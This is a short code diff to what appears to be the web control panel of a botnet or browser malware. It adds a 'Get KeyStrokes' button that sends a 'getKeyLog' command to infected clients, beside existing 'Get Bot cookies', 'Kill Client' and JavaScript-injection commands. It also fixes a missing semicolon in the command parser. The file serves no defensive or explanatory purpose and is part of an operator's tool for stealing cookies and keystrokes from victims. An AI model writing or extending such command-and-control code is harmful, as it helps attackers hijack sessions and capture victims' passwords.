@@ -49,6 +49,7 @@
                                     <!--                                    <button type="button" class="btn btn-default">srvScann</button>-->
                                     <button type="button" data-type="killclient" data-format="{'killClient': true }" class="btn btn-default">Kill Client</button>
                                     <button type="button" data-type="getCookies" data-format="{'getCookies': true }" class="btn btn-default">Get Bot cookies</button>
+                                    <button type="button" data-type="getCookies" data-format="{'getKeyLog': true }" class="btn btn-default">Get KeyStrokes</button>
                                 </div>
                             </div>
                         </div>
@@ -130,7 +131,7 @@
                     var command;
 
                     if($('#input-command').data('cmd-type') == 'injectjs') command = {"injectJs": textcmd};
-                    else command = JSON.parse(textcmd)
+                    else command = JSON.parse(textcmd);
 
                     console.log(command)
 
